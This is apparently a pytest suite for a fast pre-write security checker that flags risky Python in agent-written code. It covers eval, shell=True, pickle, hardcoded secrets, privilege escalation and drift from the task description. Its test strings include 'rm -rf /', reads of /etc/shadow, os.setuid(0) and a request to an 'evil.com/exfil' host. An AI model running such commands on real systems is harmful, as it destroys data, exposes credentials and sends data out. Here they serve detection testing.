"""Tests for Tier 1 fast pre-write checks."""

from __future__ import annotations

from unittest.mock import patch

from seraph.core.checks import run_checks
from seraph.models.enums import CheckCategory, Verdict


# ── Import Validation ──────────────────────────────────────────


def test_import_valid_module():
    """Valid stdlib imports produce no findings."""
    content = "import os\nimport json\n"
    result = run_checks("test.py", content)
    import_findings = [f for f in result.findings if f.check == CheckCategory.IMPORT_VALIDATION]
    assert not import_findings


def test_import_nonexistent_module():
    """Importing a nonexistent module produces a finding."""
    content = "import nonexistent_module_xyz_abc\n"
    result = run_checks("test.py", content)
    import_findings = [f for f in result.findings if f.check == CheckCategory.IMPORT_VALIDATION]
    assert len(import_findings) == 1
    assert "nonexistent_module_xyz_abc" in import_findings[0].description


def test_import_from_nonexistent():
    """from-import of a nonexistent module produces a finding."""
    content = "from nonexistent_module_xyz_abc import something\n"
    result = run_checks("test.py", content)
    import_findings = [f for f in result.findings if f.check == CheckCategory.IMPORT_VALIDATION]
    assert len(import_findings) == 1


def test_relative_import_skipped():
    """Relative imports are not flagged (they depend on package context)."""
    content = "from . import sibling\nfrom ..parent import thing\n"
    result = run_checks("test.py", content)
    import_findings = [f for f in result.findings if f.check == CheckCategory.IMPORT_VALIDATION]
    assert not import_findings


def test_syntax_error_no_crash():
    """Syntax errors don't crash import checking — just skip AST checks."""
    content = "def broken(\n"
    result = run_checks("test.py", content)
    # Should not raise, may still have regex-based findings
    assert result.verdict in (Verdict.ALLOW, Verdict.BLOCK)


# ── Security Surface ──────────────────────────────────────────


def test_eval_detected():
    """eval() calls are flagged."""
    content = "result = eval(user_input)\n"
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("eval()" in f.description for f in sec_findings)


def test_exec_detected():
    """exec() calls are flagged."""
    content = "exec(code_string)\n"
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("exec()" in f.description for f in sec_findings)


def test_subprocess_shell_true():
    """subprocess with shell=True is flagged."""
    content = 'subprocess.run("rm -rf /", shell=True)\n'
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("shell=True" in f.description for f in sec_findings)


def test_subprocess_hardcoded_list_suppressed():
    """subprocess with shell=True but hardcoded list args is suppressed."""
    content = 'subprocess.run(["ruff", "--select", "F401"], shell=True)\n'
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings
                    if f.check == CheckCategory.SECURITY_SURFACE and "shell" in f.description]
    assert not sec_findings


def test_os_system_detected():
    """os.system() is flagged."""
    content = 'os.system("ls -la")\n'
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("os.system()" in f.description for f in sec_findings)


def test_pickle_load_detected():
    """pickle.load() is flagged."""
    content = "data = pickle.load(f)\n"
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("pickle" in f.description for f in sec_findings)


def test_hardcoded_secret_detected():
    """Hardcoded secrets are flagged."""
    content = 'api_key = "sk-1234567890abcdef"\n'
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings if f.check == CheckCategory.SECURITY_SURFACE]
    assert any("secret" in f.description.lower() or "key" in f.description.lower()
               for f in sec_findings)


def test_credential_false_positive_env():
    """Credential reads from env are suppressed."""
    content = 'password = os.getenv("DB_PASSWORD")\n'
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings
                    if f.check == CheckCategory.SECURITY_SURFACE
                    and "secret" in f.description.lower()]
    assert not sec_findings


def test_comment_lines_skipped():
    """Comments are not flagged for security patterns."""
    content = "# eval(user_input) — this is just a comment\n"
    result = run_checks("test.py", content)
    sec_findings = [f for f in result.findings
                    if f.check == CheckCategory.SECURITY_SURFACE and "eval" in f.description]
    assert not sec_findings


# ── Escalation ─────────────────────────────────────────────────


def test_proc_access_detected():
    """/proc/ filesystem access is flagged."""
    content = 'f = open("/proc/self/maps")\n'
    result = run_checks("test.py", content)
    esc_findings = [f for f in result.findings if f.check == CheckCategory.ESCALATION]
    assert any("/proc/" in f.description for f in esc_findings)


def test_etc_shadow_detected():
    """Reading /etc/shadow is flagged."""
    content = 'open("/etc/shadow")\n'
    result = run_checks("test.py", content)
    esc_findings = [f for f in result.findings if f.check == CheckCategory.ESCALATION]
    assert any("credential" in f.description.lower() for f in esc_findings)


def test_chmod_detected():
    """os.chmod() is flagged."""
    content = 'os.chmod("/tmp/file", 0o777)\n'
    result = run_checks("test.py", content)
    esc_findings = [f for f in result.findings if f.check == CheckCategory.ESCALATION]
    assert any("chmod" in f.description for f in esc_findings)


def test_setuid_detected():
    """os.setuid() is flagged."""
    content = "os.setuid(0)\n"
    result = run_checks("test.py", content)
    esc_findings = [f for f in result.findings if f.check == CheckCategory.ESCALATION]
    assert any("setuid" in f.description for f in esc_findings)


def test_network_call_detected():
    """Outbound network calls are flagged."""
    content = 'requests.get("https://evil.com/exfil")\n'
    result = run_checks("test.py", content)
    esc_findings = [f for f in result.findings if f.check == CheckCategory.ESCALATION]
    assert any("network" in f.description.lower() for f in esc_findings)


# ── Spec Drift ─────────────────────────────────────────────────


def test_spec_drift_subprocess_detected():
    """Subprocess use not in task description is flagged."""
    diff = "@@ -1,0 +1,2 @@\n+import subprocess\n+subprocess.run(['ls'])\n"
    result = run_checks(
        "test.py", "", diff=diff,
        task_description="Add a logging utility",
    )
    drift_findings = [f for f in result.findings if f.check == CheckCategory.SPEC_DRIFT]
    assert any("subprocess" in f.description for f in drift_findings)


def test_spec_drift_mentioned_capability_not_flagged():
    """Capabilities mentioned in task description are not flagged."""
    diff = "@@ -1,0 +1,2 @@\n+import subprocess\n+subprocess.run(['test'])\n"
    result = run_checks(
        "test.py", "", diff=diff,
        task_description="Run subprocess to execute tests",
    )
    drift_findings = [f for f in result.findings
                      if f.check == CheckCategory.SPEC_DRIFT
                      and "subprocess" in f.description]
    assert not drift_findings


def test_spec_drift_no_task_description():
    """No task description means no spec drift findings."""
    diff = "@@ -1,0 +1,1 @@\n+import subprocess\n"
    result = run_checks("test.py", "", diff=diff, task_description="")
    drift_findings = [f for f in result.findings if f.check == CheckCategory.SPEC_DRIFT]
    assert not drift_findings


# ── Verdict Logic ──────────────────────────────────────────────


def test_allow_on_clean_code():
    """Clean code gets ALLOW verdict."""
    content = "x = 1 + 2\nprint(x)\n"
    result = run_checks("test.py", content)
    assert result.verdict == Verdict.ALLOW
    assert not result.findings


def test_block_on_high_confidence_finding():
    """High-confidence finding triggers BLOCK."""
    content = "result = eval(user_input)\n"
    result = run_checks("test.py", content)
    assert result.verdict == Verdict.BLOCK


def test_non_python_files_only_get_spec_drift():
    """Non-Python files skip AST/regex checks, only get spec drift."""
    content = "eval(something)"
    result = run_checks("test.js", content)
    # No security/import/escalation findings for non-Python
    py_findings = [f for f in result.findings
                   if f.check != CheckCategory.SPEC_DRIFT]
    assert not py_findings


def test_to_dict_format():
    """CheckResult.to_dict() matches expected output format."""
    content = "result = eval(user_input)\n"
    result = run_checks("test.py", content)
    d = result.to_dict()
    assert "verdict" in d
    assert d["verdict"] in ("ALLOW", "BLOCK")
    assert "findings" in d
    if d["findings"]:
        finding = d["findings"][0]
        assert "check" in finding
        assert "file" in finding
        assert "line" in finding
        assert "description" in finding
        assert "suggestion" in finding
        assert "confidence" in finding
